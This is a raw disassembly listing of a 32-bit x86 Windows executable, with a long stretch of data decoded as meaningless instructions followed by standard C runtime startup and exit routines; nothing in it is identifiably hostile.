  42251e:	and    BYTE PTR [edi-0x61d118bc],ch
  422524:	fcos   
  422526:	out    0x8d,eax
  422528:	aam    0xa3
  42252a:	lods   al,BYTE PTR ds:[esi]
  42252b:	pop    DWORD PTR [esi+0x43]
  42252e:	(bad)  
  42252f:	int3   
  422530:	inc    ebp
  422531:	cli    
  422532:	aaa    
  422533:	push   0x2f420fa
  422538:	je     0x422511
  42253a:	lock or ebx,DWORD PTR [edx+0x64]
  42253e:	push   ss
  42253f:	leave  
  422540:	outs   dx,DWORD PTR ds:[esi]
  422541:	(bad)  
  422542:	cwde   
  422543:	(bad)  
  422544:	mov    esp,0xb002d0ae
  422549:	xlat   BYTE PTR ds:[ebx]
  42254a:	lahf   
  42254b:	cld    
  42254c:	lock pop ebp
  42254e:	and    BYTE PTR [ecx+0x36],bh
  422551:	push   esi
  422552:	inc    ebx
  422553:	xchg   ecx,eax
  422554:	fldenv [ebp+ebx*1+0x42e37578]
  42255b:	jnp    0x4225c3
  42255d:	pop    edi
  42255e:	jmp    0xd8a:0x65346d25
  422565:	sub    eax,0x8980b760
  42256a:	cwde   
  42256b:	cmp    cl,BYTE PTR [esi-0x136d266f]
  422571:	or     edi,0x78d52b44
  422577:	or     eax,0x7f79a3cd
  42257c:	sub    al,0x64
  42257e:	sbb    al,0x80
  422580:	mov    ebp,0x2b0f5dc0
  422585:	stos   DWORD PTR es:[edi],eax
  422586:	mov    DWORD PTR [edx-0x1d51a943],edx
  42258c:	stc    
  42258d:	hlt    
  42258e:	(bad)  
  42258f:	int3   
  422590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422591:	pusha  
  422592:	mov    esp,0x90549472
  422597:	shl    BYTE PTR [ebx],1
  422599:	jmp    FWORD PTR [ebx+0x42951222]
  42259f:	ret    
  4225a0:	sbb    al,0xf9
  4225a2:	fs jmp 0x5a4a:0x7065924d
  4225aa:	add    BYTE PTR [ebp+0x49],0xaf
  4225ae:	mov    ds:0x13035a48,eax
  4225b3:	dec    edi
  4225b4:	adc    eax,0xe14635d4
  4225b9:	mov    ecx,0x4ff8e682
  4225be:	imul   eax,DWORD PTR [edx+0x7053dbb],0x8
  4225c5:	adc    ebp,ecx
  4225c7:	call   0x63bd2fd1
  4225cc:	cdq    
  4225cd:	lds    edx,FWORD PTR [eax-0x29e888d6]
  4225d3:	xor    eax,DWORD PTR [edi]
  4225d5:	pop    esp
  4225d6:	test   al,0x5
  4225d8:	mov    eax,ds:0x4280ef6c
  4225dd:	arpl   WORD PTR [edi-0x5a],sp
  4225e0:	cmp    esp,eax
  4225e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225e3:	or     bl,BYTE PTR [ecx+0x7e]
  4225e6:	lods   al,BYTE PTR ds:[esi]
  4225e7:	xor    BYTE PTR [edx-0x3800787],al
  4225ed:	mov    WORD PTR [esi-0x1d91791d],ds
  4225f3:	popf   
  4225f4:	cdq    
  4225f5:	fiadd  DWORD PTR [esi-0x2e752f39]
  4225fb:	inc    edi
  4225fc:	repnz adc BYTE PTR [edx-0x17],0x98
  422601:	cmp    al,0x4b
  422603:	or     esp,DWORD PTR [edx+0x30f3556]
  422609:	pop    eax
  42260a:	ja     0x42258e
  42260c:	loope  0x422654
  42260e:	scas   eax,DWORD PTR es:[edi]
  42260f:	add    BYTE PTR [edi-0x4877a58e],ch
  422615:	or     eax,ecx
  422617:	dec    edi
  422618:	add    al,0xf2
  42261a:	adc    BYTE PTR [ecx+0x7e094ac2],ah
  422620:	stc    
  422621:	adc    DWORD PTR [eax],esp
  422623:	xor    dh,bh
  422625:	repnz test al,0x75
  422628:	xlat   BYTE PTR ds:[ebx]
  422629:	cld    
  42262a:	mov    ah,0x28
  42262c:	arpl   bx,dx
  42262e:	mov    ch,0xee
  422630:	or     al,0x34
  422632:	jnp    0x422602
  422634:	fwait
  422635:	(bad)  
  422636:	mov    WORD PTR [ebp+0x46],gs
  422639:	retf   
  42263a:	or     al,0xdc
  42263c:	and    eax,0xf82d240a
  422641:	push   esp
  422642:	sub    eax,0x7b6abf33
  422647:	ret    
  422648:	sbb    BYTE PTR [edx],cl
  42264a:	push   0x23cdf1d1
  42264f:	add    esp,esp
  422651:	jecxz  0x4225fa
  422653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422654:	lahf   
  422655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422656:	pop    esi
  422657:	loopne 0x42266f
  422659:	(bad)  
  42265a:	and    DWORD PTR [edi-0x5cc1f2b1],edx
  422660:	rcl    ebp,1
  422662:	xchg   edi,eax
  422663:	mov    al,0xc4
  422665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422666:	cdq    
  422667:	push   edi
  422668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422669:	cmp    al,0x82
  42266b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266c:	daa    
  42266d:	jnp    0x4226d1
  42266f:	inc    ebx
  422670:	dec    ebx
  422671:	pop    esi
  422672:	mov    al,0x53
  422674:	push   edx
  422675:	adc    BYTE PTR [ebx],bh
  422677:	xchg   esi,eax
  422678:	and    eax,0x9bab2e27
  42267d:	bound  esi,QWORD PTR [ebx-0x49f893b5]
  422683:	pop    esi
  422684:	push   es
  422685:	adc    BYTE PTR [ebp+ecx*1-0x3f15de93],bh
  42268c:	lea    ebx,[ebp+edx*4-0x5b]
  422690:	xchg   esp,eax
  422691:	and    edi,ebx
  422693:	pop    ds
  422694:	cmp    eax,0xc52a5be6
  422699:	cmp    BYTE PTR [ebx+0x4a518c22],0xe0
  4226a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a1:	mov    al,ah
  4226a3:	in     al,dx
  4226a4:	shr    BYTE PTR [esi-0x56303289],cl
  4226aa:	iret   
  4226ab:	retf   0x69be
  4226ae:	imul   ecx,ebx,0xffffff82
  4226b1:	ret    
  4226b2:	mov    dl,0xfe
  4226b4:	jge    0x42270a
  4226b6:	push   0xffffffa0
  4226b8:	shl    DWORD PTR [esi+0x501de37],0x56
  4226bf:	cs sbb eax,0x58aa19b3
  4226c5:	pop    esp
  4226c6:	shr    BYTE PTR [eax+0x315b3f63],cl
  4226cc:	push   ss
  4226cd:	retf   0xc52b
  4226d0:	inc    edi
  4226d1:	out    0x1e,al
  4226d3:	retf   0xcf99
  4226d6:	gs clc 
  4226d8:	jne    0x42272f
  4226da:	cmp    al,0xf9
  4226dc:	addr16 pop ebx
  4226de:	fwait
  4226df:	test   al,0x50
  4226e1:	repz sub eax,0x3233dd9c
  4226e7:	mov    al,0x6d
  4226e9:	mov    eax,ds:0xb74d8176
  4226ee:	mov    ds:0x4864a62e,eax
  4226f3:	bound  ecx,QWORD PTR [edi-0x67b97b9d]
  4226f9:	ds jp  0x4226eb
  4226fc:	(bad)  
  4226fd:	bswap  ecx
  4226ff:	aas    
  422700:	push   ecx
  422701:	fcomp  QWORD PTR ds:0x4ec78b22
  422707:	pop    ds
  422708:	add    eax,0x5ac8c5e9
  42270d:	addr16 dec esp
  42270f:	push   esp
  422710:	cmp    BYTE PTR [eax],dl
  422712:	push   ebx
  422713:	sub    eax,0x6d0f7b0d
  422718:	mov    dl,ch
  42271a:	jp     0x4226ad
  42271c:	mov    al,0xe3
  42271e:	jno    0x42270e
  422720:	dec    edi
  422721:	inc    edi
  422722:	mov    ah,0x5d
  422724:	gs pop ebx
  422726:	fwait
  422727:	sub    dl,0x8
  42272a:	mov    bl,0x3f
  42272c:	inc    ebp
  42272d:	inc    edx
  42272e:	repnz inc ecx
  422730:	adc    ch,BYTE PTR [edi-0x27ce854f]
  422736:	sar    DWORD PTR [esi-0x76],cl
  422739:	out    0xe8,eax
  42273b:	jns    0x422797
  42273d:	dec    edi
  42273e:	mov    ch,0xa4
  422740:	les    ecx,FWORD PTR [edi]
  422742:	(bad)  
  422743:	push   esp
  422744:	pop    edx
  422745:	mov    edi,0xe4077de0
  42274a:	push   0xffffffc7
  42274c:	fimul  WORD PTR [esi+ebx*8]
  42274f:	sbb    eax,0x93ffd632
  422754:	sti    
  422755:	jb     0x4226ef
  422757:	cwde   
  422758:	or     eax,DWORD PTR [eax+ebp*2+0x9]
  42275c:	or     ecx,DWORD PTR [eax]
  42275e:	stos   DWORD PTR es:[edi],eax
  42275f:	mov    WORD PTR [ecx-0x6d15643b],es
  422765:	or     al,0xba
  422767:	jmp    0x4226ee
  422769:	nop
  42276a:	(bad)  
  42276b:	pop    ds
  42276c:	cmp    eax,0x540b86e
  422771:	ja     0x422772
  422773:	mov    ah,0x7f
  422775:	adc    DWORD PTR [edi+ebx*4+0x61e22a8b],0xa61139bf
  422780:	jl     0x422718
  422782:	arpl   WORD PTR [eax],dx
  422784:	sahf   
  422785:	lds    ecx,FWORD PTR [eax-0x965fcb5]
  42278b:	enter  0x9ae5,0x5e
  42278f:	rcl    DWORD PTR [edx+0x2cf3689],cl
  422795:	outs   dx,DWORD PTR ds:[esi]
  422796:	push   esi
  422797:	push   eax
  422798:	mov    ds:0xcd702410,eax
  42279d:	dec    ebp
  42279e:	imul   DWORD PTR [ebx+0xde58af1]
  4227a4:	mov    esi,0x8de5e54c
  4227a9:	fidiv  WORD PTR [esp+ebx*2+0xb]
  4227ad:	iret   
  4227ae:	inc    ebx
  4227af:	in     al,0xc9
  4227b1:	in     eax,dx
  4227b2:	retf   
  4227b3:	xor    bh,BYTE PTR [ecx]
  4227b5:	adc    al,0x5b
  4227b7:	xchg   DWORD PTR fs:[ebx+0x71],ecx
  4227bb:	add    edx,DWORD PTR [ebp-0x4a]
  4227be:	pop    edx
  4227bf:	dec    eax
  4227c0:	add    BYTE PTR [ebx+0x121d1108],ch
  4227c6:	std    
  4227c7:	jno    0x422817
  4227c9:	aas    
  4227ca:	lods   eax,DWORD PTR ds:[esi]
  4227cb:	push   edi
  4227cc:	test   BYTE PTR [eax+0x76111446],dl
  4227d2:	aam    0x1
  4227d4:	retf   
  4227d5:	gs and eax,0xc9ce1a0b
  4227db:	sub    al,0x2d
  4227dd:	cli    
  4227de:	sbb    esp,DWORD PTR [eax]
  4227e0:	adc    esi,ebx
  4227e2:	pop    esp
  4227e3:	fcomp  QWORD PTR [edi-0x70]
  4227e6:	or     BYTE PTR [esi+ebx*1],ch
  4227e9:	je     0x42276f
  4227eb:	int3   
  4227ec:	outs   dx,BYTE PTR ds:[esi]
  4227ed:	xchg   esp,eax
  4227ee:	in     eax,0x44
  4227f0:	adc    eax,0x491ecc12
  4227f5:	outs   dx,BYTE PTR ds:[esi]
  4227f6:	(bad)  
  4227f7:	shl    DWORD PTR ds:0x77eef457,cl
  4227fd:	adc    BYTE PTR [esi],bl
  4227ff:	(bad)  
  422800:	xchg   ecx,eax
  422801:	sub    edx,DWORD PTR [ebx+0x32e22632]
  422807:	(bad)  [ebp+0x27]
  42280a:	jae    0x422887
  42280c:	push   ebp
  42280d:	je     0x42287b
  42280f:	and    ah,dh
  422811:	lock scas eax,DWORD PTR es:[edi]
  422813:	fld    TBYTE PTR [edx]
  422815:	retf   
  422816:	sbb    al,0xac
  422818:	push   cs
  422819:	pop    ds
  42281a:	data16 daa 
  42281c:	sub    ah,BYTE PTR [ebp-0x26]
  42281f:	sbb    al,0x5
  422821:	xor    al,cl
  422823:	leave  
  422824:	push   DWORD PTR [eax+0x56]
  422827:	xor    al,0xf1
  422829:	mov    bh,0xc7
  42282b:	arpl   WORD PTR [eax],dx
  42282d:	jb     0x422832
  42282f:	cmp    DWORD PTR [ebx+0x73edb29e],edx
  422835:	adc    bl,BYTE PTR [edx+0x33]
  422838:	jo     0x4227f6
  42283a:	push   esi
  42283b:	jb     0x4227fa
  42283d:	ins    BYTE PTR es:[edi],dx
  42283e:	or     esi,ebp
  422840:	cmp    ch,dl
  422842:	xchg   ebx,esi
  422844:	je     0x4228a0
  422846:	jmp    0x7e0:0x15f98657
  42284d:	pop    es
  42284e:	sti    
  42284f:	repz mov bl,0xbe
  422852:	pushf  
  422853:	mov    bh,0xac
  422856:	jno    0x4227f1
  422858:	xor    dh,ch
  42285a:	aad    0x8c
  42285c:	adc    edx,esp
  42285e:	dec    esp
  42285f:	dec    edi
  422860:	in     eax,dx
  422861:	int3   
  422862:	cmp    DWORD PTR [eax-0x58],0xffffffb8
  422866:	push   es
  422867:	push   eax
  422868:	pop    eax
  422869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42286a:	jmp    0xc328b7e2
  42286f:	test   eax,0xc0f46b7f
  422874:	(bad)  
  422875:	cmp    al,0x80
  422877:	inc    ecx
  422878:	or     esp,esp
  42287a:	dec    ebp
  42287b:	inc    esp
  42287c:	xchg   esi,eax
  42287d:	pop    es
  42287e:	inc    edx
  42287f:	jl     0x42286f
  422881:	xor    eax,0x690322c0
  422886:	imul   edi,DWORD PTR [ebp-0x5e5b4b59],0xffffffcb
  42288d:	cmp    al,0x94
  42288f:	xchg   ebx,eax
  422890:	mov    al,0xe3
  422892:	xor    eax,0x2144e08
  422897:	jbe    0x42289f
  422899:	inc    edi
  42289a:	fisub  DWORD PTR [ebp+0x6435f679]
  4228a0:	bound  esp,QWORD PTR [ecx+0x3e869f83]
  4228a6:	mov    ds:0x23ea12ed,eax
  4228ab:	iret   
  4228ac:	pop    ebx
  4228ad:	dec    edx
  4228ae:	sub    al,0xfd
  4228b0:	xrelease mov DWORD PTR [edx-0x6e],ebx
  4228b4:	aaa    
  4228b5:	pop    ds
  4228b6:	push   0x3b
  4228b8:	(bad)  [edi]
  4228ba:	jnp    0x42283d
  4228bc:	int    0xbc
  4228be:	mov    eax,ds:0xadd5c4ee
  4228c3:	push   0x18
  4228c5:	fisub  WORD PTR [edi-0x5e09904e]
  4228cb:	add    BYTE PTR [edx+0x45],ah
  4228ce:	dec    edx
  4228cf:	inc    edi
  4228d0:	test   esp,esp
  4228d2:	inc    edi
  4228d3:	xor    edi,DWORD PTR [ebp-0x2133026f]
  4228d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228da:	rcr    BYTE PTR [esi-0x226418db],0xb5
  4228e1:	xchg   esp,eax
  4228e2:	nop
  4228e3:	sbb    dh,BYTE PTR [ebx+0x520ee61e]
  4228e9:	cli    
  4228ea:	xor    eax,0x413b6190
  4228ef:	repnz pop es
  4228f1:	mov    edx,0xde064ff1
  4228f6:	jmp    0x422951
  4228f8:	cmp    DWORD PTR [esi],0x21
  4228fb:	lds    edi,FWORD PTR [edi+0x59d7189c]
  422901:	fimul  DWORD PTR [ebp-0x7441f7e8]
  422907:	stos   DWORD PTR es:[edi],eax
  422908:	xchg   edx,eax
  422909:	sahf   
  42290a:	iret   
  42290b:	cwde   
  42290c:	adc    esi,DWORD PTR [esi]
  42290e:	cs jge 0x4228e0
  422911:	shl    DWORD PTR [ecx],1
  422913:	pop    ebx
  422914:	cmp    bh,dl
  422916:	out    0x4f,al
  422918:	push   ss
  422919:	xchg   esi,eax
  42291a:	daa    
  42291b:	ins    DWORD PTR es:[edi],dx
  42291c:	cmc    
  42291d:	push   es
  42291e:	lods   eax,DWORD PTR ds:[esi]
  42291f:	daa    
  422920:	dec    eax
  422921:	jnp    0x4228d9
  422923:	mov    cl,0xd8
  422925:	push   0xffffffe8
  422927:	rep lods eax,DWORD PTR ds:[esi]
  422929:	adc    al,0x6d
  42292b:	mov    ds:0xe0a358b7,eax
  422930:	lahf   
  422931:	cmp    eax,0xbea84c29
  422936:	(bad)  
  422937:	pusha  
  422938:	scas   al,BYTE PTR es:[edi]
  422939:	xchg   esp,eax
  42293a:	jns    0x4228c2
  42293c:	hlt    
  42293d:	ret    0xc05
  422940:	addr16 mov cl,0x6e
  422943:	pop    ss
  422944:	pusha  
  422945:	xor    eax,0x93131dc3
  42294a:	test   BYTE PTR [ebp+eax*2+0x4175e0a3],ah
  422951:	mov    ds:0x16ca7cb1,eax
  422956:	repz sysexit 
  422959:	sahf   
  42295a:	xor    eax,eax
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
